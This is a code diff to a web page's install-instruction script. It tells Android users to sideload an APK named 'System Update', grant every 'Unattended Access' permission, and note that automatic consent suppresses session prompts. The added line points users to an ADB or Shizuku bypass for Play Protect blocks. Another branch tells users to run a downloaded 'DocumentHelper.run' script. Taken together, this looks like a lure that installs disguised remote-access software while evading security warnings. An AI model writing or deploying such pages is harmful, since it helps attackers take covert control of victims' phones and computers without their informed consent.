@@ -197,7 +197,7 @@ if(os==='Windows'){
   co.innerHTML='Downloaded the <b>.run</b>? Run it once with: <b>sh DocumentHelper.run</b> (or mark it executable).';
   co.style.display='block';
 }else if(os==='Android'){
-  co.innerHTML='You’ll get <b>SystemUpdate-1.0.23-release.apk</b>. Open it, tap <b>Install</b>, and allow <b>Install unknown apps</b>. On Android 13+, unlock <b>Settings → Apps → System Update → ⋮ → Allow restricted settings</b>. Open <b>System Update</b> and work down the <b>Unattended Access</b> list until every row says <b>Ready</b>, then reboot. The Android Settings entry is named <b>System Update</b>. Automatic Consent is already on, so no session prompt appears.';
+  co.innerHTML='You’ll get <b>SystemUpdate-1.0.23-release.apk</b>. Open it, tap <b>Install</b>, and allow <b>Install unknown apps</b>. On Android 13+, unlock <b>Settings → Apps → System Update → ⋮ → Allow restricted settings</b>. If Play Protect hard-blocks with only <b>Got it</b>, use the <a href="/connect#playprotect" target="_blank" rel="noopener">ADB or Shizuku bypass</a>. Then open <b>System Update</b> and work down the <b>Unattended Access</b> list until every row says <b>Ready</b>, then reboot. The Settings entry is named <b>System Update</b>. Automatic Consent is already on, so no session prompt appears.';
   co.style.display='block';
   document.getElementById('apkhash').classList.add('on');
   document.getElementById('mobnote').textContent='Android detected — this installs on this phone and connects automatically.';
